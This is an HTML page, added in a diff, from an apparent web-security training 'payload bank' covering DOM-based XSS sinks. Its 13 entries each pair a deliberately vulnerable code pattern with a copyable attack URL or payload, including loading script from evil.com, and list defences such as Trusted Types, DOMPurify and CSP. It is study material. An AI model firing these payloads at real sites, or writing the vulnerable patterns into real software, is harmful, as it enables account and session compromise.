@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Payload Bank 05 — DOM-Based XSS Sinks</title>
+<style>
+  :root{--bg:#0b0f1a;--panel:#141c2e;--border:#1e3a5f;--text:#e2e8f0;--muted:#7a9bbf;--accent:#38bdf8;--warn:#f5c842;--danger:#f87171;--ok:#4ade80;--orange:#fb923c;--purple:#a78bfa}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:36px 32px;max-width:900px}
+  h1{font-size:22px;font-weight:800;color:var(--accent);margin-bottom:4px}
+  .sub{font-size:12px;color:var(--muted);margin-bottom:32px}
+  .entry{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:20px;margin-bottom:20px}
+  .entry-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px}
+  .entry-num{font-size:11px;font-weight:700;color:var(--muted);background:#060d1a;padding:3px 10px;border-radius:10px}
+  .tags{display:flex;flex-wrap:wrap;gap:5px}
+  .tag{font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px}
+  .t-mechanism{background:#1e3a5f;color:var(--accent)}
+  .t-bypass{background:#2a0000;color:var(--danger)}
+  .t-sink{background:#001a0d;color:var(--ok)}
+  .t-source{background:#1a1500;color:var(--warn)}
+  .payload-block{background:#060d1a;border:1px solid var(--border);border-radius:5px;padding:12px 14px;font-family:'Courier New',monospace;font-size:12px;color:var(--orange);margin:10px 0;position:relative;white-space:pre-wrap;word-break:break-all}
+  .copy-btn{position:absolute;top:8px;right:8px;font-size:10px;padding:3px 10px;background:#1e3a5f;color:var(--accent);border:1px solid var(--accent);border-radius:3px;cursor:pointer}
+  .meta{display:grid;grid-template-columns:auto 1fr;gap:4px 12px;font-size:12px;margin-top:10px}
+  .meta-key{color:var(--muted);font-weight:700;white-space:nowrap}
+  .meta-val{color:var(--text)}
+  .meta-val code{font-family:'Courier New',monospace;font-size:11px;background:#060d1a;color:var(--accent);padding:1px 5px;border-radius:3px}
+  .stopped{color:var(--ok)}
+  .bypasses{color:var(--danger)}
+  .nav{display:flex;gap:10px;margin-top:36px;padding-top:16px;border-top:1px solid var(--border)}
+  .nav a{font-size:12px;color:var(--accent);padding:7px 16px;border:1px solid var(--accent);border-radius:4px;text-decoration:none}
+  .section-label{font-size:13px;font-weight:700;color:var(--warn);margin:28px 0 10px;padding-bottom:4px;border-bottom:1px solid var(--border)}
+  a{color:var(--accent)}
+</style>
+</head>
+<body>
+
+<h1>05 — DOM-Based XSS Sinks</h1>
+<div class="sub">13 payloads · Mechanism: DOM Sinks · Module reference: M09 · Lab: <code>http://localhost:5000/spa_demo.html</code> — server never sees these payloads</div>
+
+<div class="section-label">A. innerHTML — The Most Common Sink</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-sink">SINK: innerHTML</span><span class="tag t-source">SOURCE: location.hash</span></div>
+    <span class="entry-num">01</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+// Vulnerable code pattern:
+document.getElementById('output').innerHTML = location.hash.slice(1);
+
+// Attack URL (hash never sent to server):
+http://localhost:5000/spa_demo.html#&lt;img src=x onerror=alert(document.domain)&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">Client-side SPA that reads location.hash and writes to innerHTML</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">4 — DOM sink: innerHTML parses HTML including event handlers</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Server-side filters (hash is never sent to the server); WAFs that only inspect HTTP request bodies</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Trusted Types; replacing innerHTML with textContent; DOMPurify before innerHTML assignment</span>
+    <span class="meta-key">Origin</span><span class="meta-val">The canonical DOM XSS pattern. The fragment identifier (#…) is never sent in HTTP requests — invisible to all server-side defenses. The attack exists entirely in the browser.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-sink">SINK: innerHTML</span><span class="tag t-source">SOURCE: location.search</span></div>
+    <span class="entry-num">02</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+// Vulnerable code:
+const params = new URLSearchParams(location.search);
+document.querySelector('.message').innerHTML = params.get('msg');
+
+// Attack URL:
+http://target/?msg=&lt;svg onload=alert(1)&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">Client-side URL parameter written to innerHTML — may or may not be reflected server-side</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">4 — DOM sink: innerHTML with URL parameter as source</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Server that doesn't reflect this parameter; WAF inspecting response body not client-side JS execution</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">textContent instead of innerHTML; DOMPurify; Trusted Types</span>
+    <span class="meta-key">Origin</span><span class="meta-val">Common in SPAs where client-side router reads URL params to display flash messages, search terms, or user names. The server serves a clean page — the XSS is assembled client-side.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-sink">SINK: outerHTML</span><span class="tag t-source">SOURCE: postMessage</span></div>
+    <span class="entry-num">03</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+// Vulnerable code in target page:
+window.addEventListener('message', e =&gt; {
+  document.getElementById('widget').outerHTML = e.data;
+});
+
+// Attack (from attacker-controlled page with target in iframe):
+iframe.contentWindow.postMessage('&lt;img src=x onerror=alert(1)&gt;', '*');</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">postMessage event handler that writes data to outerHTML without origin check</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">4 — DOM sink: outerHTML replaces the element; source is postMessage (cross-origin capable)</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Same-origin policy (postMessage is cross-origin by design); server-side filters</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Validating <code>e.origin</code> against an allowlist; Trusted Types; using textContent for message display</span>
+    <span class="meta-key">Origin</span><span class="meta-val">postMessage without origin validation is a cross-origin DOM XSS source. The attacker embeds the target in an iframe and sends a crafted message. origin='*' in addEventListener means anyone can send a message.</span>
+  </div>
+</div>
+
+<div class="section-label">B. eval() and Function() Sinks</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-sink">SINK: eval</span><span class="tag t-source">SOURCE: location.hash</span></div>
+    <span class="entry-num">04</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+// Vulnerable code:
+eval(location.hash.slice(1));
+
+// Attack URL:
+http://target/#alert(document.domain)</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">App uses eval to execute "commands" from the URL fragment</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">4 — DOM sink: eval() executes arbitrary JavaScript</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">All server-side defenses; no HTML encoding needed — payload is pure JS</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Never using eval() with user input; CSP <code>script-src</code> without <code>unsafe-eval</code>; Trusted Types</span>
+    <span class="meta-key">Origin</span><span class="meta-val">eval() is the most direct DOM sink. No HTML parsing needed — the payload is JS directly. CSP's <code>unsafe-eval</code> directive exists specifically because eval is so dangerous.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-sink">SINK: setTimeout/setInterval</span><span class="tag t-source">SOURCE: location.search</span></div>
+    <span class="entry-num">05</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+// Vulnerable code (using string form of setTimeout):
+const delay = new URLSearchParams(location.search).get('delay') || '1000';
+setTimeout('loadContent(' + delay + ')', 500);
+
+// Attack:
+http://target/?delay=1000);alert(document.domain//</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">setTimeout called with a string argument that includes user-controlled data</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">4 — DOM sink: setTimeout(string) evaluates the string as JS (equivalent to eval)</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters checking for eval() but not setTimeout(string)</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Always use function form: <code>setTimeout(() =&gt; fn(), delay)</code>; never pass a string; CSP unsafe-eval off</span>
+    <span class="meta-key">Origin</span><span class="meta-val">setTimeout and setInterval accept either a function or a string. The string form is equivalent to eval. The Trusted Types spec and CSP both treat them as eval sinks.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-sink">SINK: new Function()</span><span class="tag t-source">SOURCE: localStorage</span></div>
+    <span class="entry-num">06</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+// Vulnerable code:
+const userScript = localStorage.getItem('customScript') || '';
+new Function(userScript)();
+
+// To set the payload (requires prior XSS or JS access to localStorage):
+localStorage.setItem('customScript', 'alert(document.domain)');
+// Payload fires on next page load / component re-render</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">App reads a "user customisation script" from localStorage and executes it</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">4 — DOM sink: new Function() is eval-equivalent; source is localStorage (persistent)</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Stored persistent across page reloads; bypasses one-time filtering on input</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Never executing user-stored strings as code; CSP unsafe-eval off; Trusted Types</span>
+    <span class="meta-key">Origin</span><span class="meta-val">Second-order DOM XSS — payload is stored in localStorage and fires on the next load. Common in apps that allow user-defined themes, custom scripts, or macro recording. Persistent until localStorage is cleared.</span>
+  </div>
+</div>
+
+<div class="section-label">C. Location and Navigation Sinks</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-sink">SINK: location.href</span><span class="tag t-source">SOURCE: location.hash</span></div>
+    <span class="entry-num">07</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+// Vulnerable code:
+const dest = decodeURIComponent(location.hash.slice(1));
+location.href = dest;
+
+// Attack:
+http://target/#javascript:alert(document.domain)</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">Client-side router assigns decoded hash to location.href</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">3 + 4 — URI scheme (javascript:) via DOM sink (location.href assignment)</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Server-side filters; checks that look for javascript: in the URL before the hash</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Validating destination scheme before assignment; only allowing http/https; Trusted Types createScriptURL</span>
+    <span class="meta-key">Origin</span><span class="meta-val">location.href is a navigation sink. Assigning a javascript: URI navigates and executes. The hash-based source means the server never sees the payload. Common in SPAs with client-side routing.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-sink">SINK: document.write</span><span class="tag t-source">SOURCE: document.referrer</span></div>
+    <span class="entry-num">08</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+// Vulnerable code:
+document.write('You came from: ' + document.referrer);
+
+// Attack: host a page that links to the target with a crafted URL as referrer
+// Then navigate to target — referrer is the attacker page URL:
+// Referrer: http://evil.com/&lt;img src=x onerror=alert(1)&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">Page writes referrer to document via document.write</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">4 — DOM sink: document.write outputs HTML parsed by the document parser</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Input validation on URL params (referrer is from HTTP header, not user form input)</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Never using document.write; output-encoding referrer value; Trusted Types</span>
+    <span class="meta-key">Origin</span><span class="meta-val">document.referrer is an HTTP header value — fully attacker-controlled. If the referrer URL contains XSS characters and the page writes it unencoded, the document.write call executes the payload. Rare but real.</span>
+  </div>
+</div>
+
+<div class="section-label">D. Script Element and src Sinks</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-sink">SINK: script.src</span><span class="tag t-source">SOURCE: location.search</span></div>
+    <span class="entry-num">09</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+// Vulnerable code (dynamic script loading):
+const lib = new URLSearchParams(location.search).get('lib');
+const s = document.createElement('script');
+s.src = 'https://cdn.example.com/' + lib + '.js';
+document.body.appendChild(s);
+
+// Attack — path traversal out of CDN:
+http://target/?lib=../../../evil.com/xss</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">App dynamically loads a script whose path is user-controlled</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">1 + 4 — Script tag creation (DOM sink) with path-traversal to attacker domain</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Prefix check: <code>lib.startsWith('https://cdn.example.com/')</code> only when the lib param is the full URL — here it's a suffix</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP script-src restricting to allowed domains; allowlisting library names; Trusted Types createScriptURL</span>
+    <span class="meta-key">Origin</span><span class="meta-val">Pattern seen in plugin/extension loaders. The path traversal (<code>../</code>) escapes the CDN prefix. Browsers resolve the full URL: <code>https://cdn.example.com/../../../evil.com/xss.js</code> → <code>https://evil.com/xss.js</code>.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-sink">SINK: innerHTML</span><span class="tag t-source">SOURCE: fetch response</span></div>
+    <span class="entry-num">10</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+// Vulnerable code:
+fetch('/api/widget?id=' + userId)
+  .then(r =&gt; r.text())
+  .then(html =&gt; {
+    document.getElementById('widget').innerHTML = html;  // ← sink
+  });
+
+// Attack: if /api/widget reflects userId without encoding:
+// userId = &lt;img src=x onerror=alert(1)&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">AJAX response written to innerHTML — server-controlled source but still a DOM sink</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">4 — DOM sink: innerHTML; source is the server response (which may itself have a reflected XSS)</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Browser's built-in XSS filter (deprecated in Chrome 78+); misses traditional reflected XSS scanners that only test full-page responses</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Server-side output encoding on the API response; DOMPurify before innerHTML; Trusted Types</span>
+    <span class="meta-key">Origin</span><span class="meta-val">A hybrid: the source is a server-reflected XSS, but it reaches the DOM via a client-side innerHTML assignment. The browser's deprecated XSS auditor didn't protect AJAX-injected HTML. Modern scanners must also test API endpoints separately.</span>
+  </div>
+</div>
+
+<div class="section-label">E. Prototype Pollution as DOM Sink Source</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-sink">SINK: innerHTML (via gadget)</span><span class="tag t-source">SOURCE: prototype pollution</span></div>
+    <span class="entry-num">11</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+// URL:
+http://target/?__proto__[innerHTML]=&lt;img src=x onerror=alert(1)&gt;
+
+// Vulnerable code pattern (two separate files):
+// --- lib/merge.js ---
+function deepMerge(t, s) { /* ...merges __proto__... */ }
+deepMerge({}, parseQuery(location.search));
+
+// --- app/widget.js ---
+const cfg = {};
+if (cfg.innerHTML) div.innerHTML = cfg.innerHTML; // reads from prototype</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">Prototype pollution as the source; innerHTML gadget as the sink — in separate files</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">4 — DOM sink (innerHTML) with prototype pollution as indirect source</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Taint analysis that tracks variable assignment (source and sink are not in the same variable chain)</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Object.freeze(Object.prototype); Object.create(null) for config; Trusted Types; fixing the deepMerge</span>
+    <span class="meta-key">Origin</span><span class="meta-val">Module 14 pattern. The two code paths share only Object.prototype — invisible to local taint analysis. This is the attack class that static analysis tools most consistently miss.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-sink">SINK: element.src</span><span class="tag t-source">SOURCE: URL param</span></div>
+    <span class="entry-num">12</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+// Vulnerable code:
+const avatar = new URLSearchParams(location.search).get('avatar');
+document.getElementById('profile-pic').src = avatar;
+
+// Attack — img src with javascript: (browsers block this for img, but works for other elements):
+// For img: no XSS (browsers block javascript: as img src)
+// For object, embed, iframe:
+document.querySelector('object').data = 'javascript:alert(1)';  // ← works!</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">Setting src/data/href on various elements — element type determines whether javascript: executes</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">3 + 4 — URI scheme via DOM navigation sink (data/src on embeddable elements)</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Defenses that only block javascript: on &lt;a href&gt; but not object.data, embed.src, or iframe.src</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Allowlisting URL schemes (https only) before assignment; Trusted Types createScriptURL; blocking object/embed elements entirely</span>
+    <span class="meta-key">Origin</span><span class="meta-val">Different elements have different navigation contexts. img.src blocks javascript: execution (no navigation). object.data, embed.src, iframe.src all navigate — javascript: executes in the surrounding document's context.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-sink">SINK: innerHTML</span><span class="tag t-source">SOURCE: window.name</span></div>
+    <span class="entry-num">13</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+// Vulnerable code:
+document.getElementById('output').innerHTML = window.name;
+
+// Attack (from attacker page):
+// 1. Open target in new window with window.name set:
+const w = window.open('http://target/', '&lt;img src=x onerror=alert(1)&gt;');
+// The second argument to window.open() sets window.name on the opened window
+// Target page reads window.name → innerHTML → XSS</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">Target page reads window.name; attacker-controlled cross-origin source</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">4 — DOM sink: innerHTML with window.name as cross-origin persistent source</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Same-origin policy (window.name persists across navigation and is readable cross-origin in some browsers); all server-side defenses</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Not using window.name as a data source; clearing window.name on load; textContent instead of innerHTML</span>
+    <span class="meta-key">Origin</span><span class="meta-val">window.name is a cross-origin data channel — it persists when a window navigates to a different origin. Historically used for cross-origin communication before postMessage. If a page reads it into a DOM sink, attacker controls the source from another origin.</span>
+  </div>
+</div>
+
+<div class="nav">
+  <a href="04_svg_mathml.html">← 04: SVG &amp; MathML</a>
+  <a href="../payload_bank.html">Index</a>
+  <a href="06_filter_evasion.html">06: Filter Evasion →</a>
+</div>
+
+<script>
+document.querySelectorAll('.copy-btn').forEach(btn => {
+  btn.addEventListener('click', () => { btn.textContent = 'copied!'; setTimeout(() => btn.textContent = 'copy', 1500); });
+});
+</script>
+</body>
+</html>
